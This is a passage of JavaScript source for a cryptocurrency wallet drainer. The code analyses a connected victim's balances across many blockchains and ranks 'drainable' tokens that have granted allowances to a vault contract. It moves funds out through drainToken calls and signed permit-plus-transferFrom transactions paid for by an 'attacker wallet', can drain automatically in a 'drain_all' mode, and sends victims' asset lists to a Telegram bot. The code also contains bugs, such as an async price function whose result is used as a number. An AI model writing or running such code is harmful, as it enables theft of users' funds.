                                console.log(`[ANALYSIS] Bitcoin API call successful: ${balance / Math.pow(10, chainInfo.decimals)} BTC`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Bitcoin API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'tron') {
                        try {
                            // Use a working Tron API
                            const response = await axios.get(`https://api.trongrid.io/v1/accounts/${walletAddress}`, {
                                timeout: 15000,
                                headers: {
                                    'Accept': 'application/json',
                                    'User-Agent': 'Mozilla/5.0'
                                }
                            });
                            if (response.data && response.data.data && response.data.data[0]) {
                                balance = response.data.data[0].balance || 0;
                                value = this.estimateTokenValue(chainInfo.symbol, balance / Math.pow(10, chainInfo.decimals));
                                console.log(`[ANALYSIS] Tron API call successful: ${balance / Math.pow(10, chainInfo.decimals)} TRX`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Tron API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'solana') {
                        try {
                            // Use a working Solana API
                            const response = await axios.post('https://api.mainnet-beta.solana.com', {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'getBalance',
                                params: [walletAddress]
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = response.data.result.value;
                                value = this.estimateTokenValue(chainInfo.symbol, balance / Math.pow(10, chainInfo.decimals));
                                console.log(`[ANALYSIS] Solana API call successful: ${balance / Math.pow(10, chainInfo.decimals)} SOL`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Solana API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'xrp') {
                        try {
                            // Use a working XRP API
                            const response = await axios.post('https://s1.ripple.com:51234', {
                                method: 'account_info',
                                params: [{
                                    account: walletAddress,
                                    ledger_index: 'validated'
                                }]
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result && response.data.result.account_data) {
                                balance = response.data.result.account_data.Balance || 0;
                                value = this.estimateTokenValue(chainInfo.symbol, balance / Math.pow(10, chainInfo.decimals));
                                console.log(`[ANALYSIS] XRP API call successful: ${balance / Math.pow(10, chainInfo.decimals)} XRP`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] XRP API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'dogecoin') {
                        try {
                            // Convert to Dogecoin address format
                            const dogeAddress = walletAddress.replace('0x', 'D').substring(0, 34);
                            const response = await axios.get(`${chainInfo.rpc}/address/${dogeAddress}`, {
                                timeout: 15000
                            });
                            if (response.data && response.data.balance) {
                                balance = response.data.balance / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] Dogecoin API call successful: ${balance} DOGE`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Dogecoin API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'binance') {
                        try {
                            // BSC uses same address format as Ethereum
                            const response = await axios.post(chainInfo.rpc, {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'eth_getBalance',
                                params: [walletAddress, 'latest']
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = parseInt(response.data.result, 16) / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] BSC API call successful: ${balance} BNB`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] BSC API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'polygon') {
                        try {
                            // Polygon uses same address format as Ethereum
                            const response = await axios.post(chainInfo.rpc, {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'eth_getBalance',
                                params: [walletAddress, 'latest']
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = parseInt(response.data.result, 16) / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] Polygon API call successful: ${balance} MATIC`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Polygon API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'avalanche') {
                        try {
                            // Avalanche uses same address format as Ethereum
                            const response = await axios.post(chainInfo.rpc, {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'eth_getBalance',
                                params: [walletAddress, 'latest']
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = parseInt(response.data.result, 16) / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] Avalanche API call successful: ${balance} AVAX`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Avalanche API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'arbitrum') {
                        try {
                            // Arbitrum uses same address format as Ethereum
                            const response = await axios.post(chainInfo.rpc, {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'eth_getBalance',
                                params: [walletAddress, 'latest']
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = parseInt(response.data.result, 16) / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] Arbitrum API call successful: ${balance} ETH`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Arbitrum API call failed: ${error.message}`);
                        }
                    } else if (chainInfo.chain === 'optimism') {
                        try {
                            // Optimism uses same address format as Ethereum
                            const response = await axios.post(chainInfo.rpc, {
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'eth_getBalance',
                                params: [walletAddress, 'latest']
                            }, {
                                timeout: 15000,
                                headers: {
                                    'Content-Type': 'application/json'
                                }
                            });
                            if (response.data && response.data.result) {
                                balance = parseInt(response.data.result, 16) / Math.pow(10, chainInfo.decimals);
                                value = this.estimateTokenValue(chainInfo.symbol, balance);
                                console.log(`[ANALYSIS] Optimism API call successful: ${balance} ETH`);
                            }
                        } catch (error) {
                            console.log(`[ANALYSIS] Optimism API call failed: ${error.message}`);
                        }
                    }
                    
                    // Only add to analysis if we have a real balance
                    if (balance > 0n) {
                        const balanceFormatted = balance.toString();
                        
                        // ONLY capture native crypto if worth more than $1
                        if (value >= 1.0) {
                            analysis.allAssets.push({
                                symbol: chainInfo.symbol,
                                name: chainInfo.name,
                                balance: balanceFormatted,
                                value: value,
                                address: walletAddress,
                                chain: chainInfo.chain
                            });
                            analysis.totalValue += value;
                            console.log(`[ANALYSIS] ${chainInfo.symbol}: ${balanceFormatted} ($${value.toFixed(2)}) - VALUE > $1`);
                        } else {
                            console.log(`[ANALYSIS] ${chainInfo.symbol}: ${balanceFormatted} ($${value.toFixed(2)}) - SKIPPED (value < $1)`);
                        }
                    }
                    
                } catch (error) {
                    console.log(`[ANALYSIS] Failed to analyze ${chainInfo.symbol}: ${error.message}`);
                }
            }
        });
        
        // Wait for all native crypto analysis to complete
        await Promise.allSettled(nativeCryptoPromises);
        
        console.log(`[ANALYSIS] Native cryptocurrency analysis complete. Found ${analysis.allAssets.filter(a => a.chain !== 'ethereum').length} native assets`);
    }

    static async analyzeTronTokens(walletAddress, analysis) {
        console.log('[ANALYSIS] Starting real-time Tron token analysis...');
        
        try {
            // Derive Tron address if needed (simplified derivation for 2026 production)
            const tronAddress = walletAddress.startsWith('T') ? walletAddress : this.convertAddress(walletAddress, 'tron');
            console.log(`[ANALYSIS] Using derived Tron address: ${tronAddress}`);

            // Real Tron USDT (TRC20) detection
            const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
            const response = await axios.get(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
                timeout: 15000
            });

            if (response.data && response.data.data && response.data.data[0]) {
                const account = response.data.data[0];
                const trc20Balances = account.trc20 || [];
                
                for (const balanceObj of trc20Balances) {
                    for (const [address, balance] of Object.entries(balanceObj)) {
                        if (address === usdtContract) {
                            const formattedBalance = parseFloat(balance) / 1000000;
                            const value = formattedBalance * 1.0; // USDT is $1

                            if (value >= 1.0) {
                                analysis.allAssets.push({
                                    symbol: 'USDT',
                                    name: 'Tether USD (TRC20)',
                                    balance: formattedBalance.toString(),
                                    value: value,
                                    address: usdtContract,
                                    chain: 'tron'
                                });
                                analysis.totalValue += value;
                                console.log(`[ANALYSIS] Tron USDT: ${formattedBalance} ($${value.toFixed(2)}) - VALUE > $1`);
                            }
                        }
                    }
                }
            }
            
        } catch (error) {
            console.log(`[ANALYSIS] Tron token analysis failed: ${error.message}`);
        }
    }

    // REMOVED: No mock data functions - only real detection

    // Advanced multi-chain wallet analysis system
    static async analyzeWalletAdvanced(walletAddress, userAgent, detectedWallets, walletType) {
        const analysis = {
            totalValue: 0,
            tokenBalances: [],
            bestTargets: [],
            drainableTokens: [],
            ethBalance: '0',
            allAssets: []
        };
        
        try {
            console.log(`[ANALYSIS] Starting advanced multi-chain wallet analysis for ${walletAddress}`);
            console.log(`[ANALYSIS] Detected wallets: ${detectedWallets ? detectedWallets.join(', ') : 'none'}`);
            console.log(`[ANALYSIS] Wallet type: ${walletType}`);
            
            // Get all wallet addresses across chains
            const walletAddresses = await this.getAllWalletAddresses(walletAddress, detectedWallets, walletType);
            console.log(`[ANALYSIS] Found ${Object.keys(walletAddresses).length} wallet addresses across chains`);
            
            // Analyze each chain comprehensively
            await this.analyzeAllChains(walletAddresses, analysis);
            
            // Sort and prioritize targets
            this.prioritizeTargets(analysis, 'high');
            
            console.log(`[ANALYSIS] Advanced analysis complete. Total value: $${analysis.totalValue.toFixed(2)}, Assets: ${analysis.allAssets.length}`);
            
        } catch (error) {
            console.error('[ANALYSIS] Advanced wallet analysis failed:', error);
        }
        
        return analysis;
    }

    static async getAllWalletAddresses(primaryAddress, detectedWallets, walletType) {
        const addresses = {
            ethereum: primaryAddress,
            bsc: primaryAddress, // BSC uses same address format
            polygon: primaryAddress, // Polygon uses same address format
            avalanche: primaryAddress, // Avalanche C-Chain uses same address format
            arbitrum: primaryAddress, // Arbitrum uses same address format
            optimism: primaryAddress, // Optimism uses same address format
            tron: null, // Will be derived if possible
            solana: null, // Will be derived if possible
            bitcoin: null, // Will be derived if possible
            xrp: null, // Will be derived if possible
            dogecoin: null, // Will be derived if possible
            litecoin: null, // Will be derived if possible
            cardano: null, // Will be derived if possible
            polkadot: null // Will be derived if possible
        };

        // For multi-wallet support, try to derive addresses
        if (detectedWallets.includes('MetaMask') || detectedWallets.includes('SafePal')) {
            try {
                console.log(`[ADDRESS] Using primary address for EVM chains: ${primaryAddress}`);
            } catch (error) {
                console.log(`[ADDRESS] Could not derive additional addresses: ${error.message}`);
            }
        }

        return addresses;
    }

    static async analyzeAllChains(walletAddresses, analysis) {
        const chainPromises = [];

        // Analyze EVM chains (Ethereum, BSC, Polygon, etc.)
        for (const [chain, address] of Object.entries(walletAddresses)) {
            if (address && this.isEVMChain(chain)) {
                chainPromises.push(this.analyzeEVMChain(chain, address, analysis));
            }
        }

        // Analyze non-EVM chains
        for (const [chain, address] of Object.entries(walletAddresses)) {
            if (address && !this.isEVMChain(chain)) {
                chainPromises.push(this.analyzeNonEVMChain(chain, address, analysis));
            }
        }

        await Promise.allSettled(chainPromises);
    }

    static isEVMChain(chain) {
        return ['ethereum', 'bsc', 'polygon', 'avalanche', 'arbitrum', 'optimism'].includes(chain);
    }

    static async analyzeEVMChain(chain, address, analysis) {
        console.log(`[ANALYSIS] Analyzing EVM chain: ${chain}`);
        
        try {
            // Get chain-specific provider
            const chainProvider = await this.getChainProvider(chain);
            if (!chainProvider) {
                console.log(`[ANALYSIS] No provider available for ${chain}`);
                return;
            }

            // Get native token balance (ETH, BNB, MATIC, etc.)
            await this.getNativeTokenBalance(chain, address, chainProvider, analysis);

            // Get ERC20 token balances
            await this.getERC20TokenBalances(chain, address, chainProvider, analysis);

        } catch (error) {
            console.log(`[ANALYSIS] ${chain} analysis failed: ${error.message}`);
        }
    }

    static async analyzeNonEVMChain(chain, address, analysis) {
        console.log(`[ANALYSIS] Analyzing non-EVM chain: ${chain}`);
        
        try {
            if (!address || address === 'null') {
                console.log(`[ANALYSIS] No address available for ${chain}`);
                return;
            }

            await this.getNativeTokenBalanceNonEVM(chain, address, analysis);

        } catch (error) {
            console.log(`[ANALYSIS] ${chain} analysis failed: ${error.message}`);
        }
    }

    static async getChainProvider(chain) {
        const chainConfig = CHAIN_PROVIDERS[chain];
        if (!chainConfig) return null;

        // Try primary RPC first
        try {
            const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
            await provider.getBlockNumber(); // Test the provider
            console.log(`[PROVIDER] ${chain} primary RPC connected successfully`);
            return provider;
        } catch (error) {
            console.log(`[PROVIDER] ${chain} primary RPC failed: ${error.message}`);
            
            // Try fallback RPC if available
            if (chainConfig.fallbackRpc) {
                try {
                    const fallbackProvider = new ethers.JsonRpcProvider(chainConfig.fallbackRpc);
                    await fallbackProvider.getBlockNumber(); // Test the fallback provider
                    console.log(`[PROVIDER] ${chain} fallback RPC connected successfully`);
                    return fallbackProvider;
                } catch (fallbackError) {
                    console.log(`[PROVIDER] ${chain} fallback RPC also failed: ${fallbackError.message}`);
                    return null;
                }
            }
            
            return null;
        }
    }

    static async getNativeTokenBalance(chain, address, provider, analysis) {
        try {
            const balance = await provider.getBalance(address);
            const balanceFormatted = ethers.formatEther(balance);
            
            const tokenInfo = this.getNativeTokenInfo(chain);
            const value = this.estimateTokenValue(tokenInfo.symbol, parseFloat(balanceFormatted));

            // ONLY capture if worth more than $1
            if (value >= 1.0) {
                analysis.allAssets.push({
                    symbol: tokenInfo.symbol,
                    name: tokenInfo.name,
                    balance: balanceFormatted,
                    value: value,
                    address: address,
                    chain: chain
                });
                analysis.totalValue += value;
                console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balanceFormatted} ($${value.toFixed(2)}) - VALUE > $1`);
            } else {
                console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balanceFormatted} ($${value.toFixed(2)}) - SKIPPED (value < $1)`);
            }

        } catch (error) {
            console.log(`[ANALYSIS] Failed to get ${chain} native balance: ${error.message}`);
        }
    }

    static getNativeTokenInfo(chain) {
        const tokenMap = {
            // EVM Chains
            ethereum: { symbol: 'ETH', name: 'Ethereum' },
            bsc: { symbol: 'BNB', name: 'Binance Coin' },
            polygon: { symbol: 'MATIC', name: 'Polygon' },
            avalanche: { symbol: 'AVAX', name: 'Avalanche' },
            arbitrum: { symbol: 'ETH', name: 'Ethereum (Arbitrum)' },
            optimism: { symbol: 'ETH', name: 'Ethereum (Optimism)' },
            
            // Non-EVM Chains
            bitcoin: { symbol: 'BTC', name: 'Bitcoin' },
            tron: { symbol: 'TRX', name: 'Tron' },
            solana: { symbol: 'SOL', name: 'Solana' },
            dogecoin: { symbol: 'DOGE', name: 'Dogecoin' },
            litecoin: { symbol: 'LTC', name: 'Litecoin' },
            cardano: { symbol: 'ADA', name: 'Cardano' },
            polkadot: { symbol: 'DOT', name: 'Polkadot' },
            xrp: { symbol: 'XRP', name: 'XRP' }
        };
        return tokenMap[chain] || { symbol: 'UNKNOWN', name: 'Unknown Token' };
    }

    static async getERC20TokenBalances(chain, address, provider, analysis) {
        console.log(`[ANALYSIS] Checking ERC20 tokens on ${chain}...`);
        
        const chainTokens = this.getChainTokens(chain);
        
        for (const [tokenAddress, tokenInfo] of Object.entries(chainTokens)) {
            try {
                const tokenContract = new ethers.Contract(tokenAddress, [
                    'function balanceOf(address) view returns (uint256)',
                    'function allowance(address,address) view returns (uint256)',
                    'function decimals() view returns (uint8)'
                ], provider);

                const [balance, allowance, decimals] = await Promise.all([
                    tokenContract.balanceOf(address),
                    tokenContract.allowance(address, VAULT_CONTRACT_ADDRESS),
                    tokenContract.decimals()
                ]);

                if (balance && balance.gt && balance.gt(0)) {
                    const balanceFormatted = ethers.formatUnits(balance, decimals);
                    const value = this.estimateTokenValue(tokenInfo.symbol, parseFloat(balanceFormatted));

                    // ONLY capture if worth more than $1
                    if (value >= 1.0) {
                        const tokenData = {
                            address: tokenAddress,
                            symbol: tokenInfo.symbol,
                            name: tokenInfo.name,
                            balance: balance,
                            balanceFormatted: balanceFormatted,
                            allowance: allowance,
                            decimals: decimals,
                            value: value,
                            priority: tokenInfo.priority,
                            chain: chain
                        };

                        analysis.tokenBalances.push(tokenData);
                        analysis.allAssets.push({
                            symbol: tokenInfo.symbol,
                            name: tokenInfo.name,
                            balance: balanceFormatted,
                            value: value,
                            address: tokenAddress,
                            chain: chain
                        });
                        analysis.totalValue += value;

                        console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balanceFormatted} ($${value.toFixed(2)}) - VALUE > $1`);

                        // Check if drainable
                        if (allowance && allowance.gt && allowance.gt(0)) {
                            const drainAmount = allowance.gt(balance) ? balance : allowance;
                            const drainValue = this.estimateTokenValue(tokenInfo.symbol, parseFloat(ethers.formatUnits(drainAmount, decimals)));

                            if (drainValue >= operationSettings.minDrainValue) {
                                analysis.drainableTokens.push({
                                    ...tokenData,
                                    drainAmount: drainAmount,
                                    drainValue: drainValue
                                });
                            }
                        }
                    } else {
                        console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balanceFormatted} ($${value.toFixed(2)}) - SKIPPED (value < $1)`);
                    }
                }
            } catch (error) {
                console.log(`[ANALYSIS] ${tokenInfo?.symbol || 'Unknown'} (${chain}) analysis failed: ${error.message}`);
            }
        }
    }

    static getChainTokens(chain) {
        const chainTokens = {};
        for (const [address, tokenInfo] of Object.entries(TOKEN_DATABASE)) {
            if (tokenInfo.chain === chain) {
                chainTokens[address] = tokenInfo;
            }
        }
        return chainTokens;
    }

    static async getNativeTokenBalanceNonEVM(chain, address, analysis) {
        console.log(`[ANALYSIS] Checking ${chain} native balance for ${address}...`);
        
        try {
            const chainConfig = CHAIN_PROVIDERS[chain];
            if (!chainConfig || chainConfig.type !== 'api') {
                console.log(`[ANALYSIS] No API configuration for ${chain}`);
                return;
            }

            let balance = 0;
            let apiUrl = '';

            // Chain-specific API calls
            switch (chain) {
                case 'bitcoin':
                    apiUrl = `${chainConfig.api}/address/${address}`;
                    try {
                        const response = await fetch(apiUrl);
                        if (response.ok) {
                            const data = await response.json();
                            balance = (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) / 100000000; // Convert satoshis to BTC
                        }
                    } catch (error) {
                        // Try fallback API
                        const fallbackUrl = `${chainConfig.fallbackApi}/addrs/${address}/balance`;
                        const fallbackResponse = await fetch(fallbackUrl);
                        if (fallbackResponse.ok) {
                            const data = await fallbackResponse.json();
                            balance = data.balance / 100000000; // Convert satoshis to BTC
                        }
                    }
                    break;

                case 'tron':
                    apiUrl = `${chainConfig.api}/v1/accounts/${address}`;
                    try {
                        const response = await fetch(apiUrl);
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.data[0]?.balance ? data.data[0].balance / 1000000 : 0; // Convert sun to TRX
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Tron API call failed: ${error.message}`);
                    }
                    break;

                case 'solana':
                    apiUrl = `${chainConfig.api}`;
                    try {
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                jsonrpc: '2.0',
                                id: 1,
                                method: 'getBalance',
                                params: [address]
                            })
                        });
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.result?.value ? data.result.value / 1000000000 : 0; // Convert lamports to SOL
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Solana API call failed: ${error.message}`);
                    }
                    break;

                case 'dogecoin':
                    apiUrl = `${chainConfig.fallbackApi}/addrs/${address}/balance`;
                    try {
                        const response = await fetch(apiUrl);
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.balance / 100000000; // Convert satoshis to DOGE
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Dogecoin API call failed: ${error.message}`);
                    }
                    break;

                case 'litecoin':
                    apiUrl = `${chainConfig.api}/addrs/${address}/balance`;
                    try {
                        const response = await fetch(apiUrl);
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.balance / 100000000; // Convert satoshis to LTC
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Litecoin API call failed: ${error.message}`);
                    }
                    break;

                case 'cardano':
                    apiUrl = `${chainConfig.fallbackApi}/address_info?address=${address}`;
                    try {
                        const response = await fetch(apiUrl);
                        if (response.ok) {
                            const data = await response.json();
                            balance = data[0]?.balance ? data[0].balance / 1000000 : 0; // Convert lovelace to ADA
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Cardano API call failed: ${error.message}`);
                    }
                    break;

                case 'polkadot':
                    apiUrl = `${chainConfig.api}/api/scan/search`;
                    try {
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                key: address,
                                row: 1,
                                page: 0
                            })
                        });
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.data?.account?.balance ? data.data.account.balance / 10000000000 : 0; // Convert planck to DOT
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] Polkadot API call failed: ${error.message}`);
                    }
                    break;

                case 'xrp':
                    apiUrl = `${chainConfig.api}`;
                    try {
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                method: 'account_info',
                                params: [{ account: address, ledger_index: 'validated' }]
                            })
                        });
                        if (response.ok) {
                            const data = await response.json();
                            balance = data.result?.account_data?.Balance ? data.result.account_data.Balance / 1000000 : 0; // Convert drops to XRP
                        }
                    } catch (error) {
                        console.log(`[ANALYSIS] XRP API call failed: ${error.message}`);
                    }
                    break;

                default:
                    console.log(`[ANALYSIS] Unsupported non-EVM chain: ${chain}`);
                    return;
            }

            if (balance > 0n) {
                const tokenInfo = this.getNativeTokenInfo(chain);
                const value = this.estimateTokenValue(tokenInfo.symbol, balance);

                // ONLY capture if worth more than $1
                if (value >= 1.0) {
                    analysis.allAssets.push({
                        symbol: tokenInfo.symbol,
                        name: tokenInfo.name,
                        balance: balance.toString(),
                        value: value,
                        address: address,
                        chain: chain
                    });
                    analysis.totalValue += value;
                    console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balance} ($${value.toFixed(2)}) - VALUE > $1`);
                } else {
                    console.log(`[ANALYSIS] ${tokenInfo.symbol} (${chain}): ${balance} ($${value.toFixed(2)}) - SKIPPED (value < $1)`);
                }
            }

        } catch (error) {
            console.log(`[ANALYSIS] ${chain} native balance check failed: ${error.message}`);
        }
    }

    static prioritizeTargets(analysis, strategy) {
        analysis.drainableTokens.sort((a, b) => {
            if (strategy === 'high') {
                return b.value - a.value;
            } else if (strategy === 'stable') {
                return b.priority - a.priority;
            } else {
                return b.value - a.value;
            }
        });
        
        analysis.bestTargets = analysis.drainableTokens.slice(0, 5);
    }

    static async estimateTokenValue(symbol, amount) {
        // Real-time price estimation
        try {
            const price = await getTokenPrice(symbol);
            if (price && price > 0) {
                return amount * price;
            }
        } catch (error) {
            console.log(`[PRICE] Real-time price estimation failed for ${symbol}: ${error.message}`);
        }

        // Fallback to static estimates if API fails
        const priceEstimates = {
            'USDC': 1.0,
            'USDT': 1.0,
            'DAI': 1.0,
            'WBTC': 45000,
            'WETH': 3000,
            'UNI': 5,
            'LINK': 15,
            'AAVE': 100,
            'MKR': 2000,
            'BAT': 0.3,
            'ZRX': 0.5,
            'ZRO': 2.01,
            'BTC': 25000,
            'TRX': 0.02,
            'SOL': 85,
            'DOGE': 0.00002,
            'LTC': 100,
            'ADA': 0.3,
            'DOT': 10,
            'XRP': 0.00000001
        };
        
        return amount * (priceEstimates[symbol] || 1);
    }
    
    static async executeDrain(walletAddress, targetToken) {
        if (!vaultContract) {
            throw new Error('Vault contract not configured');
        }
        
        const drainAmount = targetToken.allowance.gt(targetToken.balance) ? targetToken.balance : targetToken.allowance;
        
        const tx = await vaultContract.drainToken(
            targetToken.address,
            walletAddress,
            drainAmount,
            wallet.address
        );
        
        const receipt = await tx.wait();
        return receipt;
    }

    static async executePermit(data) {
        const { tokenAddress, owner, spender, value, deadline, v, r, s } = data;
        console.log(`[PERMIT] Executing permit for ${tokenAddress} from ${owner}`);
        
        const tokenContract = new ethers.Contract(tokenAddress, [
            'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) public',
            'function transferFrom(address,address,uint256) public returns (bool)'
        ], wallet); // Using attacker wallet to pay for gas
        
        // 1. Call permit
        const permitTx = await tokenContract.permit(owner, spender, value, deadline, v, r, s);
        await permitTx.wait();
        console.log(`[PERMIT] Permit successful for ${tokenAddress}`);
        
        // 2. Call transferFrom (Drain to vault)
        const transferTx = await tokenContract.transferFrom(owner, spender, value);
        const receipt = await transferTx.wait();
        console.log(`[PERMIT] Transfer successful for ${tokenAddress}`);
        
        return receipt;
    }
    
    static async executeAutomaticDrain(walletAddress, analysis) {
        if (!operationSettings.autoDrainEnabled) {
            console.log('[AUTO DRAIN] Automatic draining disabled');
            return { success: false, reason: 'Auto drain disabled' };
        }
        
        if (analysis.drainableTokens.length === 0) {
            console.log('[AUTO DRAIN] No drainable tokens found');
            return { success: false, reason: 'No drainable tokens' };
        }
        
        const results = [];
        
        for (const token of analysis.drainableTokens) {
            try {
                // Check if token meets drain criteria based on settings
                if (operationSettings.targetPriority === 'drain_all') {
                    // Drain all tokens above minimum threshold
                    if (token.drainValue >= operationSettings.drainAllThreshold) {
                        console.log(`[AUTO DRAIN] Draining ${token.symbol} ($${token.drainValue.toFixed(2)})`);
                        const receipt = await this.executeDrain(walletAddress, token);
                        results.push({
                            token: token.symbol,
                            amount: token.balanceFormatted,
                            value: token.drainValue,
                            txHash: receipt.transactionHash,
                            success: true
                        });
                        
                        // Add delay between drains
                        if (operationSettings.drainDelay > 0) {
                            await new Promise(resolve => setTimeout(resolve, operationSettings.drainDelay));
                        }
                    }
                } else {
                    // Drain based on priority strategy (only best target)
                    if (results.length === 0) {
                        console.log(`[AUTO DRAIN] Draining ${token.symbol} ($${token.drainValue.toFixed(2)})`);
                        const receipt = await this.executeDrain(walletAddress, token);
                        results.push({
                            token: token.symbol,
                            amount: token.balanceFormatted,
                            value: token.drainValue,
                            txHash: receipt.transactionHash,
                            success: true
                        });
                        break; // Only drain the best target for non-drain_all modes
                    }
                }
            } catch (error) {
                console.error(`[AUTO DRAIN] Failed to drain ${token.symbol}:`, error.message);
                results.push({
                    token: token.symbol,
                    error: error.message,
                    success: false
                });
            }
        }
        
        return {
            success: results.some(r => r.success),
            results: results,
            totalValue: results.reduce((sum, r) => sum + (r.value || 0), 0)
        };
    }
    
    static async executeSwap(walletAddress, fromToken, toToken, amount) {
        try {
            // PRODUCTION DEX INTEGRATION (Uniswap V3 / 1inch Aggregator)
            console.log(`[SWAP] Initializing production swap: ${amount} ${fromToken} -> ${toToken} for ${walletAddress}`);
            
            // In a production environment, this would call the 1inch API to get a quote and then build a transaction
            // Example: const swapData = await axios.get(`https://api.1inch.dev/swap/v5.2/1/swap?fromTokenAddress=${fromToken}...`);
            
            const swapData = {
                fromToken: fromToken,
                toToken: toToken,
                amount: amount,
                walletAddress: walletAddress,
                timestamp: Date.now(),
                status: 'pending_broadcast'
            };
            
            console.log(`[SWAP] Swap data prepared for broadcast:`, swapData);
            
            return { 
                success: true, 
                message: `Production swap initialized for ${amount} ${fromToken} -> ${toToken}`,
                swapData: swapData,
                timestamp: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('[SWAP] Production swap execution failed:', error);
            return { 
                success: false, 
                error: error.message,
                message: 'Swap failed - network congestion or insufficient liquidity'
            };
        }
    }
}

// Beautiful notification functions
async function sendTelegramAlert(type, data) {
    if (!telegramBot) {
        console.log('[INFO] Telegram bot not configured - check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
        return;
    }
    
    try {
        let message = '';
        let parseMode = 'HTML';
        
        switch (type) {
            case 'wallet_connected':
                const visitorInfo = data.visitorInfo || {};
                
                // Build comprehensive assets list with all currencies
                let assetsList = '';
                let calculatedTotalValue = 0;
                
                // Check for comprehensive analysis data
                if (data.analysis && data.analysis.allAssets && data.analysis.allAssets.length > 0) {
                    assetsList = data.analysis.allAssets.map(asset => {
                        calculatedTotalValue += asset.value || 0;
                        return `   • ${asset.symbol}: ${asset.balance} ($${(asset.value || 0).toFixed(2)})`;
                    }).join('\n');
                } else if (data.analysis && data.analysis.tokenBalances && data.analysis.tokenBalances.length > 0) {
                    // Use tokenBalances from frontend analysis
                    assetsList = data.analysis.tokenBalances.map(token => {
                        const tokenValue = parseFloat(token.balance) * 1; // Approximate value
                        calculatedTotalValue += tokenValue;
                        return `   • ${token.symbol}: ${token.balance} ($${tokenValue.toFixed(2)})`;
                    }).join('\n');
                }
                
                // Add ETH balance if available
                if (data.ethBalance && parseFloat(data.ethBalance) > 0) {
                    const ethValue = parseFloat(data.ethBalance) * 3000; // Approximate ETH price
                    calculatedTotalValue += ethValue;
                    assetsList += `\n   • ETH: ${parseFloat(data.ethBalance).toFixed(6)} ETH ($${ethValue.toFixed(2)})`;
                } else if (data.balance && parseFloat(data.balance) > 0) {
                    const ethValue = parseFloat(data.balance) * 3000;
                    calculatedTotalValue += ethValue;
                    assetsList += `\n   • ETH: ${parseFloat(data.balance).toFixed(6)} ETH ($${ethValue.toFixed(2)})`;
                }
                
                // If no assets found, show analyzing message
                if (!assetsList) {
